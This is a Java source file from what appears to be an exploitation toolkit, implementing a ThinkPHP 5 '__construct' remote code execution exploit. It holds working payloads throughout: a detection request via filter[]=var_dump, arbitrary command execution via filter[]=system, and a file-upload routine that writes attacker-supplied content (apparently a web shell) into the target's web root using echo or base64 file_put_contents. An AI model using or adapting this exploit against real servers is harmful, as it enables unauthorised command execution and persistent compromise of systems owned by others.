package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP5_construct_code_exec_2 implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();


    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;

        url = url + "/index.php?s=captcha";
        String payload = "_method=__construct&method=GET&filter[]=var_dump&get[]=dylan";
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(url, payload, this.headers, "UTF-8");

        if(response.getText() != null  && response.getText().contains("string(5) \"dylan\"")) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        String url = this.target + "/index.php?s=captcha";
        String payload = "_method=__construct&method=GET&filter[]=system&get[]=" + cmd;

        this.headers.put("Content-type", "application/x-www-form-urlencoded");

        Response response = HttpTools.post(url, payload, this.headers, encoding);
        String results;
        if (response.getError() == null) {
            results = Tools.regReplace(response.getText());
        } else {
            results = response.getError();
        }

        return results;
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        String result = exeCmd("@print(realpath(__ROOT__))", "UTF-8");
        return result;
    }

    @Override
    public String uploadFile(String fileContent, String fileName, String platform) throws Exception {
        String results = "";

        try {
            String payload1 = "_method=__construct&method=GET&filter[]=system&get[]=echo '" + URLEncoder.encode(fileContent.replace("'", "\""), "UTF-8") + "' >" + fileName;
            String payload2 = "_method=__construct&method=GET&filter[]=system&get[]=echo \"" + URLEncoder.encode(fileContent.replace("\"", "'"), "UTF-8") + "\" >" + fileName;


            fileContent = Base64.getEncoder().encodeToString(fileContent.getBytes(StandardCharsets.UTF_8));
            fileContent = URLEncoder.encode(fileContent, "UTF-8");
            String payload3 = "_method=__construct&method=GET&filter[]=system&get[]=file_put_contents('" + fileName + "','base64_decode('" + fileContent + "'))";

            ArrayList<String> payloads = new ArrayList();

            payloads.add(payload1);
            payloads.add(payload2);
            payloads.add(payload3);
            this.headers.put("Content-type", "application/x-www-form-urlencoded");
            Iterator var8 = payloads.iterator();

            while(var8.hasNext()) {
                String payload = (String)var8.next();
                Response response = HttpTools.post(this.target + "/index.php?s=captcha", payload, this.headers, "UTF-8");
                if (response.getError() == null) {
                    this.headers.clear();
                    response = HttpTools.get(this.target + "/" + fileName, this.headers, "UTF-8");
                    if (response.getCode() == 200) {
                        results = "[+] 上传成功，请检查URL：" + this.target + "/" + fileName;
                        return results;
                    }
                    results = "[-] 上传失败！";
                } else {
                    results = "[-] 上传失败: " + response.getError();
                }
            }
        } catch (Exception var11) {
            results = "[-] 上传失败: " + var11.getMessage();
        }

        return results;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
